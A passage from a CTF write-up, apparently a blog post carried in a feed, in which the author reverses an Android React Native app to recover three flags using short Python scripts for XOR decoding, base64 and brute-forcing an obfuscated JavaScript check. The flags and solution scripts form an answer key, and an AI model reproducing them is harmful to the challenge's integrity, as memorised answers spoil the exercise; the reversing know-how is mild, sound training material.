+decodedflag&lt;span style="color:#f92672">.&lt;/span>append(encryptedFlag[i] &lt;span style="color:#f92672">^&lt;/span> key[i &lt;span style="color:#f92672">%&lt;/span> len(key)])
+b &lt;span style="color:#f92672">=&lt;/span> [chr(s) &lt;span style="color:#66d9ef">for&lt;/span> s &lt;span style="color:#f92672">in&lt;/span> decodedflag]
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(b))
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag 3: &lt;code>CFI{plz_no_secret_in_java_code}&lt;/code>&lt;/p>
+&lt;p>Since I found flag3 first I must have missed some stuff.&lt;/p>
+&lt;h2 id="flag-1">Flag 1&lt;/h2>
+&lt;p>Refering back to my earlier screenshot, after performing the grep there&amp;rsquo;s some base64 encoded data which I should have been more keen to look at!&lt;/p>
+&lt;p>base64: &lt;code>Q1NfS0V7YmFzZTY0X2VuY29kaW5nX2lzX25vdF90aGF0X3NlY3VyZX0=&lt;/code>&lt;/p>
+&lt;p>Flag 1: &lt;code>CS_KE{base64_encoding_is_not_that_secure}&lt;/code>&lt;/p>
+&lt;h2 id="flag-2">Flag 2&lt;/h2>
+&lt;p>Now flag 2 was the last to find. Since most of the clues we have been finding were in that &lt;code>assets/index.android.bundle&lt;/code> file let me have a look at it.&lt;/p>
+&lt;p>&lt;del>Something I noted was that jadx didn’t find this file, that why the approach to use two tools is good IMO.&lt;/del> A friend of mine has pointed out that it was actually there under Resources/assets on the jadx ui, nevertheless using two or more tools for analysis is still a good practice IMO. There is a lot of code in this file that is not easily readable, so I just googled what this file is.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf3.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
+&lt;p>I found that this file contains minified-javascript, it is created when an android app is developed using react. We already saw mentions of react when reading the code in jadx.&lt;/p>
+&lt;p>Reading the code in it&amp;rsquo;s minified form isn&amp;rsquo;t easy so js-beautifier to the rescue. I then opened the readable version in vs code and searched for the validateflag function again.&lt;/p>
+&lt;p>I landed here and we can clearly see the function that contained the base64 and the the other one that called flag3, due to their order flag 2 is what is left.&lt;/p>
+&lt;img src="https://blog.ikuamike.io/img/cyberspacectf/cyberspacectf4.png" alt="cyberspacectf" class="center" style="border-radius: 8px;" />
+&lt;p>I took the same approach to porting the code to python as it is easier for me to work with. I had to do a bit of googling to understand the js flow but came up with this:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">f&lt;/span>(n):
+t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+r &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+e &lt;span style="color:#f92672">=&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> r &lt;span style="color:#f92672">in&lt;/span> range(len(n)):
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> r:
+t &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
+&lt;span style="color:#66d9ef">else&lt;/span>:
+t &lt;span style="color:#f92672">-=&lt;/span> len(n) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>
+u &lt;span style="color:#f92672">=&lt;/span> ord(n[r]) &lt;span style="color:#f92672">+&lt;/span> t
+e&lt;span style="color:#f92672">.&lt;/span>append(str(u))
+&lt;span style="color:#66d9ef">return&lt;/span> e
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>At the end, the output of the function is checked if it is equal to that list of numbers which is a hex representation of characters. Instead of trying to undo the transformation that was going on in the function where they add 13&amp;hellip; which I tried for a few hours and failed, better to bruteforce all possibilities.&lt;/p>
+&lt;p>I came up with this script for that:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#f92672">import&lt;/span> string
+k &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">64&lt;/span>,&lt;span style="color:#ae81ff">80&lt;/span>,&lt;span style="color:#ae81ff">78&lt;/span>,&lt;span style="color:#ae81ff">141&lt;/span>,&lt;span style="color:#ae81ff">124&lt;/span>,&lt;span style="color:#ae81ff">124&lt;/span>,&lt;span style="color:#ae81ff">123&lt;/span>,&lt;span style="color:#ae81ff">151&lt;/span>,&lt;span style="color:#ae81ff">144&lt;/span>,&lt;span style="color:#ae81ff">141&lt;/span>,&lt;span style="color:#ae81ff">134&lt;/span>,&lt;span style="color:#ae81ff">166&lt;/span>,&lt;span style="color:#ae81ff">146&lt;/span>,&lt;span style="color:#ae81ff">158&lt;/span>,&lt;span style="color:#ae81ff">148&lt;/span>,&lt;span style="color:#ae81ff">172&lt;/span>,&lt;span style="color:#ae81ff">158&lt;/span>,&lt;span style="color:#ae81ff">192&lt;/span>,&lt;span style="color:#ae81ff">166&lt;/span>,&lt;span style="color:#ae81ff">197&lt;/span>,&lt;span style="color:#ae81ff">176&lt;/span>,&lt;span style="color:#ae81ff">204&lt;/span>,&lt;span style="color:#ae81ff">190&lt;/span>,&lt;span style="color:#ae81ff">210&lt;/span>,&lt;span style="color:#ae81ff">209&lt;/span>,&lt;span style="color:#ae81ff">201&lt;/span>,&lt;span style="color:#ae81ff">206&lt;/span>,&lt;span style="color:#ae81ff">229&lt;/span>,&lt;span style="color:#ae81ff">204&lt;/span>,&lt;span style="color:#ae81ff">232&lt;/span>,&lt;span style="color:#ae81ff">228&lt;/span>,&lt;span style="color:#ae81ff">246&lt;/span>,&lt;span style="color:#ae81ff">220&lt;/span>,&lt;span style="color:#ae81ff">253&lt;/span>,&lt;span style="color:#ae81ff">234&lt;/span>,&lt;span style="color:#ae81ff">245&lt;/span>,&lt;span style="color:#ae81ff">258&lt;/span>,&lt;span style="color:#ae81ff">268&lt;/span>,&lt;span style="color:#ae81ff">250&lt;/span>,&lt;span style="color:#ae81ff">262&lt;/span>,&lt;span style="color:#ae81ff">282&lt;/span>]
+all &lt;span style="color:#f92672">=&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable
+a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;a&amp;#34;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">41&lt;/span>
+flag &lt;span style="color:#f92672">=&lt;/span> [a[i] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(a))]
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">f&lt;/span>(n):
+t &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
+r &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
+e &lt;span style="color:#f92672">=&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> r &lt;span style="color:#f92672">in&lt;/span> range(len(n)):
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> r:
+t &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">13&lt;/span>
+&lt;span style="color:#66d9ef">else&lt;/span>:
+t &lt;span style="color:#f92672">-=&lt;/span> len(n) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">9&lt;/span>
+u &lt;span style="color:#f92672">=&lt;/span> ord(n[r]) &lt;span style="color:#f92672">+&lt;/span> t
+e&lt;span style="color:#f92672">.&lt;/span>append(str(u))
+&lt;span style="color:#66d9ef">return&lt;/span> e
+&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(flag)):
+&lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(len(all)):
+flag[i] &lt;span style="color:#f92672">=&lt;/span> all[j]
+out &lt;span style="color:#f92672">=&lt;/span> f(flag)
+&lt;span style="color:#66d9ef">if&lt;/span> out[i] &lt;span style="color:#f92672">==&lt;/span> str(k[i]):
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(flag))
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Flag 2: &lt;code>CFI{obfuscated_javascript_is_not_secured}&lt;/code>&lt;/p>
+&lt;h1 id="conclusion">Conclusion&lt;/h1>
+&lt;p>This was a good ctf for practising some code review. I also had never played around with an app made with react so that was something I learnt.&lt;/p>
+&lt;p>I&amp;rsquo;d like to thank the CyberSpace Kenya team for putting up the challenge as well as &lt;a href="https://twitter.com/ZuluMeats" target="_blank" rel="noopener">ZuluMeats&lt;/a>
+for the prize.&lt;/p>
+&lt;p>You can find more challenges on their website: &lt;a href="https://ctf.cyberspace.co.ke">https://ctf.cyberspace.co.ke&lt;/a>&lt;/p>
+&lt;p>For any questions you can reach me on Twitter.&lt;/p>
+&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p>
+&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
+&lt;/p></content></item></channel></rss>
